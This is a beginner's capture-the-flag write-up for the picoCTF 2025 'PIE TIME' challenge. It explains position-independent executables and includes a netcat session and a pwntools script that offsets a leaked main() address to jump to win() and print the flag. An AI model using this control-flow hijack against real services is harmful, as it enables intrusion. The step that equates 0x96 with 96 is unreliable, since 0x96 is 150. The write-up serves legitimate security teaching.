# PIE TIME - picoCTF 2025 Writeup (For Absolute Beginners)

**Challenge Name:** PIE TIME
**Category:** Binary Exploitation (Don’t worry — we’ll explain!)
**Difficulty:** Easy
**Author:** Darkraicg492
**Platform:** picoCTF 2025
**Tags:** `beginner`, `binary`, `PIE`, `hacking`
**Flag:** ✅ `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}`

---

## 🤔 What’s This Challenge About?

This is a challenge from a hacking game called **picoCTF**. You're given a **small program** that hides a **secret code** (called a flag).

Your job is to find that flag.

The catch? The program is trying to make it hard by hiding the flag inside a secret part of itself, and moving that secret around every time it runs.

---

## 🧠 What’s a "Binary"?

In computers, a “binary” is just a program — like a `.exe` file on Windows or an app on your phone. It’s made of code that the computer can run.

In this challenge, you’re given one of those programs, and you have to trick it into showing you the secret.

---

## 🚧 But What’s PIE?

Great question!

**PIE** stands for **Position Independent Executable**. That’s a scary name, but here’s the simple idea:

Normally, a program keeps its important parts (like where the flag is) in the **same place** every time you run it.

But with PIE, the program says:

> "I’m going to hide my important parts in a **different** place **every** time!"

It’s like trying to find a key that someone hides in a new drawer every time you enter the room. So, how do we deal with that?

👉 Easy: Ask the program **where one thing is**, and then figure out where the secret is **relative** to it.

---

## 🪜 Step-by-Step Instructions

### ✅ Step 1: Run the program

You connect to the program using a tool called **netcat**.

Just open your terminal and run:

```bash
nc rescued-float.picoctf.net 50495
```

You’ll see something like:

```
Address of main: 0x5cc766cfa33d
Enter the address to jump to, ex => 0x12345:
```

Whoa! It’s giving us an address! Don’t worry if that looks scary. That’s actually helpful!

---

### 🧩 Step 2: What does this address mean?

The program is telling us:

> "Hey, this part of me called `main()` is at this location in memory: `0x5cc766cfa33d`."

Think of `main()` like a door in the building. The flag is in another door called `win()` — and it’s always the **same distance away** from `main()`, even though the building moves around.

From the files provided, we know that `win()` is **96 steps before** `main()`.

So all we do is:

> Take the number the program gave us, and **subtract 96** from it.

---

### 🧮 Step 3: Do the math

You can use Python to do it:

```python
print(hex(0x5cc766cfa33d - 0x96))
```

This gives you something like:

```
0x5cc766cfa2a7
```

That’s where the hidden `win()` function is — the one that gives us the flag!

---

### ✉️ Step 4: Send that new address back to the program

The program says:

> Enter the address to jump to

So just paste in:

```
0x5cc766cfa2a7
```

If it works, you’ll see something like:

```
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}
```

🎉 Boom! That’s the flag!

---

## 🤖 Want to Automate It?

If you get tired of doing the math by hand, you can write a **simple script** that does it for you.

Here’s an example using Python and a tool called `pwntools`:

```python
from pwn import *

host = "rescued-float.picoctf.net"
port = 50495

# Connect to the program
r = remote(host, port)

# Read the line that has the memory address
line = r.recvline_contains(b"Address of main:")
leaked_addr = int(line.split()[-1], 16)

# Subtract 96 (0x96 in hex)
win_addr = leaked_addr - 0x96
print(f"Jumping to: {hex(win_addr)}")

# Send the new address
r.sendline(hex(win_addr))

# Print what the program says next
print(r.recvall().decode())
```

---

## 📦 How to Use the Script

1. Save the code above in a file called `exploit.py`
2. Install pwntools (just once):

```bash
pip install pwntools
```

3. Run the script:

```bash
python3 exploit.py
```

You’ll get the flag automatically. Easy!

---

## 🏁 The Flag

```
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}
```

---

## 🎓 What You Learned

* What a binary is (a program).
* What PIE is (the program moves stuff around).
* How to find something that moves, by tracking something else that moves with it.
* How to use math and automation to find secrets in a program.

---
